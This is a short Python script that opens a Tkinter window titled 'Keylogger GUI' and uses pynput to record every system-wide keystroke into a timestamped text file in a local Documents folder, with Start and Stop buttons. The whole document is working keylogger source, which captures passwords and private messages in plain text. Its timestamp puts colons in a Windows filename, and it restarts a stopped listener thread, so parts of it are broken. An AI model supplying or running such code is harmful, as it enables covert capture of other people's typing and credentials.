import tkinter as tk
from pynput import keyboard
from datetime import datetime

log_file = 'C:\\Users\\hjgkkghj\\Documents\\AI Assistant\\' + str(datetime.now().strftime("%Y-%m-%d_%H:%M:%S")) + '.txt'

def on_press(key):
    with open(log_file, 'a') as f:
        f.write(str(key))

class KeyboardListenerApp(tk.Tk):
    def __init__(self):
        super().__init__()

        self.title('Keylogger GUI')

        self.listener_started = False
        self.listener = keyboard.Listener(on_press=on_press)

        start_button = tk.Button(self, text='Start', command=self.start_listener)
        start_button.pack(pady=10)

        stop_button = tk.Button(self, text='Stop', command=self.stop_listener)
        stop_button.pack()

    def start_listener(self):
        if not self.listener_started:
            self.listener.start()
            self.listener_started = True

    def stop_listener(self):
        if self.listener_started:
            self.listener.stop()
            self.listener_started = False

if __name__ == "__main__":
    app = KeyboardListenerApp()
    app.mainloop()
